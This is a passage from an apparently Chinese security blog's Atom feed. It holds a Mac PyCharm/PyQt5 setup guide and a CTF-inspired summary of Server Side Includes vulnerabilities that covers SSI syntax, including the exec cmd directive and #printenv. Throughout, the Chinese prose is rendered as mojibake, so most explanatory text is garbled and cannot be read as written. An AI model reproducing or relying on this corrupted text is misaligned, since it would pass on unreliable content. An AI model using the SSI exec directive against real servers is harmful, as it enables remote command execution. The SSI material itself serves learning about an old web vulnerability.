      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®</title>
    <link href="http://0clickjacking0.github.io/2019/10/30/Mac%E4%B8%8Bpycharm-python3-7-PyQt5-Qt5-13-1%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2019/10/30/Macä¸‹pycharm-python3-7-PyQt5-Qt5-13-1é…ç½®/</id>
    <published>2019-10-30T01:27:22.000Z</published>
    <updated>2019-11-13T03:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®</p><a id="more"></a><h1 id="åˆå§‹ç¯å¢ƒï¼š"><a href="#åˆå§‹ç¯å¢ƒï¼š" class="headerlink" title="åˆå§‹ç¯å¢ƒï¼š"></a>åˆå§‹ç¯å¢ƒï¼š</h1><p>mac: 10.13.6</p><p>pycharm: 2018.2.8</p><p>python: 3.7</p><p>pip: 10.0.1</p><h1 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h1><h2 id="å®‰è£…pyqt5"><a href="#å®‰è£…pyqt5" class="headerlink" title="å®‰è£…pyqt5"></a>å®‰è£…pyqt5</h2><p>æ‰§è¡Œä¸‹é¢ä¸¤æ¡è¯­å¥è¿›è¡Œå®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line"></span><br><span class="line">pip3 install PyQt5-sip</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…sip"><a href="#å®‰è£…sip" class="headerlink" title="å®‰è£…sip"></a>å®‰è£…sip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install sip</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…qt"><a href="#å®‰è£…qt" class="headerlink" title="å®‰è£…qt"></a>å®‰è£…qt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt</span><br></pre></td></tr></table></figure><h1 id="é…ç½®PyCharm"><a href="#é…ç½®PyCharm" class="headerlink" title="é…ç½®PyCharm"></a>é…ç½®PyCharm</h1><h2 id="åˆ‡æ¢åˆ°Python3-xç¯å¢ƒ"><a href="#åˆ‡æ¢åˆ°Python3-xç¯å¢ƒ" class="headerlink" title="åˆ‡æ¢åˆ°Python3.xç¯å¢ƒ"></a>åˆ‡æ¢åˆ°<code>Python3.x</code>ç¯å¢ƒ</h2><p>å› ä¸ºæˆ‘é»˜è®¤å°±æ˜¯<code>3.x</code></p><p><img src="http://images.xianyu123.club/python3_env.png" alt></p><h2 id="é…ç½®GUIè®¾è®¡å·¥å…·"><a href="#é…ç½®GUIè®¾è®¡å·¥å…·" class="headerlink" title="é…ç½®GUIè®¾è®¡å·¥å…·"></a>é…ç½®GUIè®¾è®¡å·¥å…·</h2><p>ç‚¹å‡»<code>â•</code>è¿›è¡Œæ·»åŠ </p><p><img src="http://images.xianyu123.club/qt1.png" alt></p><h3 id="æ·»åŠ Qt-Designer"><a href="#æ·»åŠ Qt-Designer" class="headerlink" title="æ·»åŠ Qt Designer"></a>æ·»åŠ Qt Designer</h3><p>ç„¶åå¡«å†™ä¸‹é¢çš„ä¿¡æ¯å³å¯ï¼ˆå› ä¸ºæˆ‘æ˜¯ç”¨homebrewå®‰è£…qtçš„ï¼Œæ‰€ä»¥è·¯å¾„å¯èƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå„ä½çœ‹ä»”ç»†äº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----Qt Designer</span><br><span class="line"></span><br><span class="line">Program----/usr/local/Cellar/qt/5.13.0/libexec/Designer.app</span><br><span class="line"></span><br><span class="line">Arguments----è¿™ä¸ªä¸éœ€è¦å¡«å†™</span><br><span class="line"></span><br><span class="line">Working dirctory----/usr/local/Cellar/qt/5.13.0/libexec</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt2.png" alt></p><h3 id="æ·»åŠ PyUIC"><a href="#æ·»åŠ PyUIC" class="headerlink" title="æ·»åŠ PyUIC"></a>æ·»åŠ PyUIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----PyUIC</span><br><span class="line"></span><br><span class="line">Program----/Library/Frameworks/Python.framework/Versions/3.7/bin/pyuic5</span><br><span class="line"></span><br><span class="line">Arguments----$FileName$ -o $FileNameWithoutExtension$.py</span><br><span class="line"></span><br><span class="line">Working dirctory----$FileDir$</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt3.png" alt></p><h3 id="éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ "><a href="#éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ " class="headerlink" title="éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ "></a>éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ </h3><p>ç‚¹å‡»tools-external tools</p><p><img src="http://images.xianyu123.club/qt4.png" alt></p><p>å¦‚æœæœ‰ä¸‹é¢è¿™ç§æ˜¾ç¤ºçš„è¯ï¼Œå°±ä»£è¡¨æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/qt5.png" alt></p><p>ç„¶åæˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ª<code>ui</code>æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»uiæ–‡ä»¶ï¼Œå³é”®ä½¿ç”¨æˆ‘ä»¬åˆšæ‰æ·»åŠ çš„external toolsä¸­PyUICï¼Œå¦‚æœèƒ½æˆåŠŸå¯¼å‡ºï¼Œåˆ™è¯´æ˜æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/qt6.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://0clickjacking0.github.io/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>ssiæ¼æ´å°ç»“</title>
    <link href="http://0clickjacking0.github.io/2019/09/13/ssi%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/09/13/ssiæ¼æ´å°ç»“/</id>
    <published>2019-09-13T12:21:40.000Z</published>
    <updated>2019-09-15T08:54:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰“çœèµ›çš„æ—¶å€™é‡åˆ°äº†ï¼Œè¿™é‡Œè®°å½•å­¦ä¹ ä¸€ä¸‹å§¿åŠ¿</p><a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸ªæ¼æ´æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„æ¼æ´ï¼Œå› ä¸ºä»Šå¹´çš„çœèµ›é‡åˆ°äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè®°å½•å­¦ä¹ ä¸€ä¸‹ã€‚</p><h1 id="å…³äºSSI"><a href="#å…³äºSSI" class="headerlink" title="å…³äºSSI"></a>å…³äºSSI</h1><p>SSIæ˜¯è‹±æ–‡â€Server Side Includesâ€çš„ç¼©å†™ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯æœåŠ¡å™¨ç«¯åŒ…å«çš„æ„æ€ã€‚</p><p>SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚</p><p>ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h1 id="å¯ç”¨SSI"><a href="#å¯ç”¨SSI" class="headerlink" title="å¯ç”¨SSI"></a>å¯ç”¨SSI</h1><p><strong>ç¤ºä¾‹ï¼šNginx é…ç½®SSIåŠŸèƒ½</strong></p><p>åœ¨httpæ®µä¸­åŠ å…¥ä¸‹é¢å‡ å¥å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text/shtml;</span><br></pre></td></tr></table></figure><p>é»˜è®¤Apacheä¸å¼€å¯SSIï¼ŒSSIè¿™ç§æŠ€æœ¯å·²ç»æ¯”è¾ƒå°‘ç”¨äº†ã€‚å¦‚æœåº”ç”¨æ²¡æœ‰ä½¿ç”¨åˆ°SSIï¼Œå…³é—­æœåŠ¡å™¨å¯¹SSIçš„æ”¯æŒå³å¯ã€‚</p><p>IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼Œå…·ä½“å¯å‚è€ƒ:<a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="noopener">Apacheã€Nginx æœåŠ¡é…ç½®æœåŠ¡å™¨ç«¯åŒ…å«ï¼ˆSSIï¼‰](http://m.jb51.net/article/25725.htm</a></p><h1 id="SSIè¯­æ³•"><a href="#SSIè¯­æ³•" class="headerlink" title="SSIè¯­æ³•"></a>SSIè¯­æ³•</h1><h2 id="configæŒ‡ä»¤ï¼šç”¨äºä¿®æ”¹SSIçš„é»˜è®¤è®¾ç½®"><a href="#configæŒ‡ä»¤ï¼šç”¨äºä¿®æ”¹SSIçš„é»˜è®¤è®¾ç½®" class="headerlink" title="configæŒ‡ä»¤ï¼šç”¨äºä¿®æ”¹SSIçš„é»˜è®¤è®¾ç½®"></a>configæŒ‡ä»¤ï¼šç”¨äºä¿®æ”¹SSIçš„é»˜è®¤è®¾ç½®</h2><p>å‚æ•°ï¼š<code>errmsg</code>,<code>timefmt</code>, <code>sizefmt</code></p><p><strong>errmsg</strong>:è®¾ç½®é»˜è®¤çš„é”™è¯¯ä¿¡æ¯ï¼Œè¯¥æŒ‡ä»¤å¿…é¡»å…¥åœ¨å…¶å®ƒæŒ‡ä»¤çš„å‰é¢</p><p>egï¼š<code>&lt;!--#config errmsg=&quot;error!please email mamager!&quot;--&gt;</code></p><p><strong>Timefmt</strong>:è®¾ç½®æ—¥æœŸä¸æ—¶é—´çš„æ˜¾ç¤ºæ ¼å¼ï¼Œéœ€æ”¾åœ¨echoæŒ‡ä»¤å‰</p><p>egï¼š<code>&lt;!--#config timefmt=&quot;%A, %B %d, %Y&quot;--&gt;</code></p><p>ã€€<code>&lt;!--#echo var=&quot;last_modified&quot;--&gt;</code></p><p><strong>Sizefmt</strong>:è®¾ç½®è¡¨ç¤ºæ–‡ä»¶å¤§å°çš„å•ä½ã€‚å¦‚bytesã€‚è¯¥æŒ‡ä»¤éœ€è¦æ”¾åœ¨fsizeæŒ‡ä»¤å‰ä½¿ç”¨ã€‚</p><p>egï¼š<code>&lt;!--#config sizefmt=&quot;bytes&quot;--&gt;</code></p><p>ã€€<code>&lt;!--#fsize file=&quot;head.html&quot;--&gt;</code></p><h2 id="IncludeæŒ‡ä»¤ï¼šç”¨äºå°†å…¶å®ƒæ–‡æ¡£æˆ–å…ƒç´ åŒ…å«åœ¨å½“å‰æ–‡æ¡£ä¸­"><a href="#IncludeæŒ‡ä»¤ï¼šç”¨äºå°†å…¶å®ƒæ–‡æ¡£æˆ–å…ƒç´ åŒ…å«åœ¨å½“å‰æ–‡æ¡£ä¸­" class="headerlink" title="IncludeæŒ‡ä»¤ï¼šç”¨äºå°†å…¶å®ƒæ–‡æ¡£æˆ–å…ƒç´ åŒ…å«åœ¨å½“å‰æ–‡æ¡£ä¸­"></a>IncludeæŒ‡ä»¤ï¼šç”¨äºå°†å…¶å®ƒæ–‡æ¡£æˆ–å…ƒç´ åŒ…å«åœ¨å½“å‰æ–‡æ¡£ä¸­</h2><p>å‚æ•°ï¼š<code>virtual</code> ï¼Œ<code>file</code></p><p><strong>virtual</strong>:ç»™å‡ºåˆ°æœåŠ¡å™¨ç«¯æŸä¸ªæ–‡æ¡£çš„è™šæ‹Ÿè·¯å¾„</p><p>egï¼š<code>&lt;!--include virtual=&quot;/includes/header.html&quot;--&gt;</code></p><p><strong>file</strong>:ç»™å‡ºåˆ°å½“å‰ç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼Œå…¶ä¸­ä¸èƒ½ä½¿ç”¨â€../â€œï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„</p><p>egï¼š<code>&lt;!--include file=&quot;header.html&quot;--&gt;</code></p><p>è¿™å°±è¦æ±‚æ¯ä¸€ä¸ªç›®å½•ä¸­éƒ½åŒ…å«ä¸€ä¸ªheader.htmlæ–‡ä»¶ã€‚</p><h2 id="execæŒ‡ä»¤ï¼šå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ï¼Œæ‰§è¡ŒCGIè„šæœ¬æˆ–è€…shellå‘½ä»¤"><a href="#execæŒ‡ä»¤ï¼šå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ï¼Œæ‰§è¡ŒCGIè„šæœ¬æˆ–è€…shellå‘½ä»¤" class="headerlink" title="execæŒ‡ä»¤ï¼šå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ï¼Œæ‰§è¡ŒCGIè„šæœ¬æˆ–è€…shellå‘½ä»¤"></a>execæŒ‡ä»¤ï¼šå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ï¼Œæ‰§è¡ŒCGIè„šæœ¬æˆ–è€…shellå‘½ä»¤</h2><p>å‚æ•°ï¼šcmdï¼Œcgi</p><p>cmd å¸¸è§„åº”ç”¨ç¨‹åºï¼š<code>&lt;!--#exec cmd=&quot;æ–‡ä»¶åç§°&quot;--&gt;</code></p><p>cgi CGIè„šæœ¬ç¨‹åºï¼š<code>&lt;!--#exec cgi=&quot;æ–‡ä»¶åç§°&quot;--&gt;</code></p><p>æ³¨æ„ï¼šè¿™ä¸ªæŒ‡ä»¤ç›¸å½“æ–¹ä¾¿,ä½†æ˜¯ä¹Ÿå­˜åœ¨å®‰å…¨é—®é¢˜ã€‚</p><h2 id="echoï¼šç”¨äºæ˜¾ç¤ºå„ç§ç¯å¢ƒå˜é‡"><a href="#echoï¼šç”¨äºæ˜¾ç¤ºå„ç§ç¯å¢ƒå˜é‡" class="headerlink" title="echoï¼šç”¨äºæ˜¾ç¤ºå„ç§ç¯å¢ƒå˜é‡"></a>echoï¼šç”¨äºæ˜¾ç¤ºå„ç§ç¯å¢ƒå˜é‡</h2><p>å‚æ•°ï¼švar</p><p>egï¼š<code>&lt;!--#config timefmt=&quot;%A,the %d of %B,in the year %Y&quot;--&gt;</code></p><p>ã€€<code>&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</code></p><p>è¾“å‡ºç»“æœï¼š<code>Saturday, the 15 of April, in the year 2000</code></p><h2 id="ä»¥ä¸‹æ˜¯å¸¸è§çš„æœåŠ¡å™¨å˜é‡"><a href="#ä»¥ä¸‹æ˜¯å¸¸è§çš„æœåŠ¡å™¨å˜é‡" class="headerlink" title="ä»¥ä¸‹æ˜¯å¸¸è§çš„æœåŠ¡å™¨å˜é‡"></a>ä»¥ä¸‹æ˜¯å¸¸è§çš„æœåŠ¡å™¨å˜é‡</h2><p><code>DOCUMENT_NAME</code>ï¼šæ˜¾ç¤ºå½“å‰æ–‡æ¡£çš„åç§°</p><p><code>DOCUMENT_URI</code>ï¼šæ˜¾ç¤ºå½“å‰æ–‡æ¡£çš„è™šæ‹Ÿè·¯å¾„</p><p><code>QUERY_STRING_UNESCAPED</code>ï¼šæ˜¾ç¤ºæœªç»è½¬ä¹‰å¤„ç†çš„ç”±å®¢æˆ·ç«¯å‘é€çš„æŸ¥è¯¢å­—ä¸²ï¼Œå…¶ä¸­æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦å‰é¢éƒ½æœ‰è½¬ä¹‰ç¬¦â€\</p><p><code>DATE_LOCAL</code>ï¼šæ˜¾ç¤ºæœåŠ¡å™¨è®¾å®šæ—¶åŒºçš„æ—¥æœŸå’Œæ—¶é—´ã€‚ç”¨æˆ·å¯ä»¥ç»“åˆconfigå‘½ä»¤çš„timefmtå‚æ•°ï¼Œå®šåˆ¶è¾“å‡ºä¿¡æ¯</p><p><code>DATE_GMT</code>ï¼šåŠŸèƒ½ä¸DATE_LOCALä¸€æ ·ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯ä»¥æ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ä¸ºåŸºå‡†çš„æ—¥æœŸ</p><p><code>LAST_MODIFIED</code>ï¼šæ˜¾ç¤ºå½“å‰æ–‡æ¡£çš„æœ€åæ›´æ–°æ—¶é—´</p><h2 id="é™¤äº†SSIç¯å¢ƒå˜é‡ä¹‹å¤–ï¼Œechoå‘½ä»¤è¿˜å¯ä»¥æ˜¾ç¤ºä»¥ä¸‹CGIç¯å¢ƒå˜é‡"><a href="#é™¤äº†SSIç¯å¢ƒå˜é‡ä¹‹å¤–ï¼Œechoå‘½ä»¤è¿˜å¯ä»¥æ˜¾ç¤ºä»¥ä¸‹CGIç¯å¢ƒå˜é‡" class="headerlink" title="é™¤äº†SSIç¯å¢ƒå˜é‡ä¹‹å¤–ï¼Œechoå‘½ä»¤è¿˜å¯ä»¥æ˜¾ç¤ºä»¥ä¸‹CGIç¯å¢ƒå˜é‡"></a>é™¤äº†SSIç¯å¢ƒå˜é‡ä¹‹å¤–ï¼Œechoå‘½ä»¤è¿˜å¯ä»¥æ˜¾ç¤ºä»¥ä¸‹CGIç¯å¢ƒå˜é‡</h2><p><code>SERVER_SOFTWARE</code>ï¼šæ˜¾ç¤ºæœåŠ¡å™¨è½¯ä»¶çš„åç§°å’Œç‰ˆæœ¬</p><p><code>SERVER_NAME</code>ï¼šæ˜¾ç¤ºæœåŠ¡å™¨çš„ä¸»æœºåç§°ï¼ŒDNSåˆ«åæˆ–IPåœ°å€</p><p><code>SERVER_PROTOCOL</code>ï¼šæ˜¾ç¤ºå®¢æˆ·ç«¯è¯·æ±‚æ‰€ä½¿ç”¨çš„åè®®åç§°å’Œç‰ˆæœ¬ï¼Œå¦‚HTTP/1.0</p><p><code>SERVER_PORT</code>ï¼šæ˜¾ç¤ºæœåŠ¡å™¨çš„å“åº”ç«¯å£</p><p><code>REQUEST_METHOD</code>ï¼šæ˜¾ç¤ºå®¢æˆ·ç«¯çš„æ–‡æ¡£è¯·æ±‚æ–¹æ³•ï¼ŒåŒ…æ‹¬GET, HEAD, å’ŒPOST</p><p><code>REMOTE_HOST</code>ï¼šæ˜¾ç¤ºå‘å‡ºè¯·æ±‚ä¿¡æ¯çš„å®¢æˆ·ç«¯ä¸»æœºåç§°</p><p><code>REMOTE_ADDR</code>ï¼šæ˜¾ç¤ºå‘å‡ºè¯·æ±‚ä¿¡æ¯çš„å®¢æˆ·ç«¯IPåœ°å€</p><p><code>AUTH_TYPE</code>ï¼šæ˜¾ç¤ºç”¨æˆ·èº«ä»½çš„éªŒè¯æ–¹æ³•</p><p><code>REMOTE_USER</code>:æ˜¾ç¤ºè®¿é—®å—ä¿æŠ¤é¡µé¢çš„ç”¨æˆ·æ‰€ä½¿ç”¨çš„å¸å·åç§°</p><p>Fsizeï¼šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å¤§å°ï¼Œå¯ä»¥ç»“åˆconfigå‘½ä»¤çš„sizefmtå‚æ•°å®šåˆ¶è¾“å‡ºæ ¼å¼</p><p>å‚æ•°ï¼šfile</p><p>egï¼š<code>&lt;!--#fsize file=&quot;index_working.html&quot;--&gt;</code></p><h2 id="Flastmod"><a href="#Flastmod" class="headerlink" title="Flastmod"></a>Flastmod</h2><p>æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¥æœŸï¼Œå¯ä»¥ç»“åˆconfigå‘½ä»¤çš„timefmtå‚æ•°æ§åˆ¶è¾“å‡ºæ ¼å¼</p><p>å‚æ•°ï¼šfile</p><p>egï¼š<code>&lt;!--#config timefmt=&quot;%A, the %d of %B, in the year %Y&quot;--&gt;</code></p><p>ã€€ã€€<code>&lt;!--#flastmod file=&quot;file.html&quot;--&gt;</code></p><h2 id="XSSI-Extended-SSI"><a href="#XSSI-Extended-SSI" class="headerlink" title="XSSI(Extended SSI)"></a>XSSI(Extended SSI)</h2><p>ä¸€ç»„é«˜çº§SSIæŒ‡ä»¤,å†…ç½®äºApache1.2æˆ–æ›´é«˜ç‰ˆæœ¬çš„mod-includeæ¨¡å—ä¹‹ä¸­ã€‚</p><p><strong>#printenv</strong>ï¼šæ˜¾ç¤ºå½“å‰å­˜åœ¨äºWEBæœåŠ¡å™¨ç¯å¢ƒä¸­çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ã€‚<br>è¯­æ³•ï¼š<code>&lt;!--#printenv--&gt;</code></p><p><strong>#set</strong>ï¼šå¯ç»™å˜é‡èµ‹å€¼,ä»¥ç”¨äºåé¢çš„ifè¯­å¥ã€‚<br>è¯­æ³•ï¼š<code>&lt;!--#set var=&quot;å˜é‡å&quot; value=&quot;å˜é‡å€¼&quot;--&gt;</code><br>egï¼š<br><code>&lt;!--#set var=&quot;color&quot; value=&quot;red&quot;--&gt;</code><br><code>&lt;!--#echo var=&quot;color&quot;--&gt;</code></p><p><strong>#if</strong>ï¼šåˆ›å»ºå¯ä»¥æ”¹å˜æ•°æ®çš„é¡µé¢,è¿™äº›æ•°æ®æ ¹æ®ä½¿ç”¨ifè¯­å¥æ—¶è®¡ç®—çš„è¦æ±‚äºˆä»¥æ˜¾ç¤ºã€‚<br>è¯­æ³•ï¼š<br><code>&lt;!--#if expr=&quot;$å˜é‡å=&#39;å˜é‡å€¼A&#39;&quot;--&gt;</code><br>  æ˜¾ç¤ºå†…å®¹<br><code>&lt;!--#elif expr=&quot;$å˜é‡å=&#39;å˜é‡å€¼B&#39;&quot;--&gt;</code><br>  æ˜¾ç¤ºå†…å®¹<br><code>&lt;!--#else--&gt;</code><br>  æ˜¾ç¤ºå†…å®¹<br><code>&lt;!--#endif--&gt;</code><br>egï¼š<br><code>&lt;!--#if expr=&quot;$color=&#39;red&#39;&quot;--&gt;</code><br>    çº¢è‰²<br><code>&lt;!--#elif expr=&quot;$color=&#39;blue&#39;&quot;--&gt;</code><br>    è“è‰²<br><code>&lt;!--#else--&gt;</code><br>    é»‘è‰²<br><code>&lt;!--#endif--&gt;</code></p><h2 id="SSIå†…ç½®çš„å˜é‡"><a href="#SSIå†…ç½®çš„å˜é‡" class="headerlink" title="SSIå†…ç½®çš„å˜é‡"></a>SSIå†…ç½®çš„å˜é‡</h2><p><code>AUTH_TYPE</code> â€”â€”é’ˆå¯¹ç”¨æˆ·çš„è®¤è¯æˆæƒæ–¹å¼ï¼š BASIC ï¼Œ FORM ï¼Œ etc. å’Œ Tomcat å†…çš„è®¤è¯æ–¹å¼åŒæ­¥<br><code>CONTENT_LENGTH</code> â€”â€”ä»æœåŠ¡å™¨è¡¨å•ä¼ è¿‡æ¥çš„æ•°æ®é•¿åº¦ï¼Œå­—ç¬¦æ•°ç›®æˆ–è€…æ•°æ®çš„å­—èŠ‚æ•°<br><code>CONTENT_TYPE</code> â€”â€”æœåŠ¡å™¨è®¿é—®å‘¢æ•°æ®çš„ MIME ç±»å‹ï¼Œæ¯”å¦‚â€œ text/html â€<br><code>DATE_GMT</code> â€”â€”ç›®å‰çš„æ—¶é—´æ ¼å¼æ–¹å¼ä½¿ç”¨ GMT<br><code>DATE_LOCAL</code> â€”â€”ç›®å‰çš„æ—¶é—´æ ¼å¼æ–¹å¼è®¾ç½®æˆä¸ºæœ¬åœ°æ—¶é—´æ ¼å¼<br><code>DOCUMENT_NAME</code> â€”â€”å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒçš„æ–‡ä»¶åœ°å€<br><code>DOCUMENT_URI</code> â€”â€”è™šæ‹Ÿè·¯å¾„å®šä¹‰çš„æ–‡ä»¶åœ°å€<br><code>GATEWAY_INTERFACE</code> â€”â€” CGI çš„ç‰ˆæœ¬å®šä¹‰ï¼šâ€œ CGI/1.1 â€<br><code>HTTP_ACCEPT</code> â€”â€”ä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥æ¥å—çš„ MIME ç±»å‹åˆ—è¡¨<br><code>HTTP_ACCEPT_ENCODING</code> â€”â€”å®¢æˆ·ç«¯å¯ä»¥æ¥å—çš„å‹ç¼©æ–‡ä»¶ç±»å‹çš„åˆ—è¡¨<br><code>HTTP_ACCEPT_LANGUAGE</code> â€”â€”å®¢æˆ·ç«¯å¯ä»¥æ”¯æŒçš„è¯­è¨€åˆ—è¡¨<br><code>HTTP_CONNECTION</code> â€”â€”ç®¡ç†å®¢æˆ·ç«¯çš„è¿æ¥ï¼šæ˜¯â€œ Close â€è¿˜æ˜¯â€œ Keep-Alive â€<br><code>HTTP_HOST</code> â€”â€”å®¢æˆ·ç«¯è¯·æ±‚çš„ç«™ç‚¹åœ°å€<br><code>HTTP_REFERER</code> â€”â€”å®¢æˆ·ç«¯è¯·æ±‚ä¹‹å‰æ‰€åœ¨çš„ URL åœ°å€<br><code>HTTP_USER_AGENT</code> â€”â€”å®¢æˆ·ä½¿ç”¨çš„æµè§ˆå™¨ç«¯çš„è¯·æ±‚ç»“æœ<br><code>LAST_MODIFIED</code> â€”â€”å½“å‰é¡µé¢ä¸Šä¸€æ¬¡è®¿é—®å’Œä¿®æ”¹çš„æ—¶é—´<br><code>PATH_INFO</code> â€”â€”è®¿é—®æ­¤ Servlet çš„è·¯å¾„ä¿¡æ¯<br><code>PATH_TRANSLATED</code> â€”â€” PATH_INFO æä¾›çš„ translated ç‰ˆæœ¬<br><code>QUERY_STRING</code> â€”â€”åœ¨ URL åœ°å€ ? ä¹‹åçš„è¯·æ±‚å‚æ•°åˆ—è¡¨<br><code>QUERY_STRING_D</code> â€”â€”æ²¡æœ‰ç»è¿‡ç¼–ç è¿‡çš„è¯·æ±‚å‚æ•°<br><code>REMOTE_ADDR</code> â€”â€”ç”¨æˆ·è¯·æ±‚å®¢æˆ·ç«¯ IP åœ°å€<br><code>REMOTE_HOST</code> â€”â€”ç”¨æˆ·å‘é€è¯·æ±‚çš„ä¸»æœºå<br><code>REMOTE_PORT</code> â€”â€”ç”¨æˆ·å‘é€è¯·æ±‚çš„ç«¯å£å·<br><code>REMOTE_USER</code> â€”â€”è®¤è¯æˆæƒéœ€è¦çš„å‘é€è¯·æ±‚çš„ç”¨æˆ·å<br><code>REQUEST_METHOD</code> â€”â€”è¯·æ±‚ä½¿ç”¨æ–¹æ³•ï¼š GET æˆ–è€… POST<br><code>REQUEST_URI</code> â€”â€”å®¢æˆ·ç«¯åŸæ¥è®¿é—®è¯·æ±‚çš„ Web é¡µé¢çš„ URI åœ°å€<br><code>SCRIPT_FILENAME</code> â€”â€”åœ¨æœåŠ¡å™¨ä¸Šå½“å‰é¡µé¢çš„åœ°å€<br><code>SCRIPT_NAME</code> â€”â€”å½“å‰é¡µé¢çš„åç§°<br><code>SERVER_ADDR</code> â€”â€”æœåŠ¡å™¨æ‰€åœ¨çš„ IP åœ°å€<br><code>SERVER_NAME</code> â€”â€”æœåŠ¡å™¨çš„ä¸»æœºåæˆ–è€… IP åœ°å€<br><code>SERVER_PORT</code> â€”â€”æœåŠ¡å™¨æ¥å—è¯·æ±‚çš„ç«¯å£å·<br><code>SERVER_PROTOCOL</code> â€”â€”æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„åè®®ï¼šâ€œ HTTP/1.1 â€<br><code>SERVER_SOFTWARE</code> â€”â€”æœåŠ¡å™¨å“åº”å®¢æˆ·ç«¯è¯·æ±‚çš„åç§°å’Œç‰ˆæœ¬å·</p><h2 id="SSIä¸­æ—¥æœŸæ ¼å¼çš„å®šä¹‰"><a href="#SSIä¸­æ—¥æœŸæ ¼å¼çš„å®šä¹‰" class="headerlink" 